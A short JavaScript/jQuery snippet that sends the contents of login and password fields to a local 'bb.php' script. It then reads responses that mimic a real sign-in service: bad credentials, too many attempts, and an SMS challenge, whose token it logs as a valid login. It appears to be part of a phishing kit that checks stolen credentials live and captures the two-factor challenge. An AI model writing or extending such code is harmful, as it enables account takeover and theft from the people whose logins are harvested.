let METHODE_ENVOI_REQUEST = "./bb.php"
$(document).on('click','#atan',function(){
    $.ajax({
        type: "POST",
        url: METHODE_ENVOI_REQUEST,
        cash: false,
        data: {"login":$('.login').val(),"password":$('.password').val()},
        beforeSend: function() {
            // $('.loader_befor').removeClass('hide');
        },
        success: function(data) {
            var json = JSON.parse(data);

            console.log(json)
            

            if(json.message && json.message == "error.badCredentials"){
                console.log("log ghalet")
            }else if(json.message && json.message == "error.tooManyPasswordAttempts"){
                console.log("many request hena")
            }else if(json.message && json.message == "error.authenticationChallenge"){
                if(json.challengeType && json.challengeType == "SMS"){
                    var token = json.challengeToken;
                    console.log("challengeToken="+token)
                    console.log("login valid")
                }
  
            }else if(json.title && json.title == "Bad Request"){

            }

        }
    })
})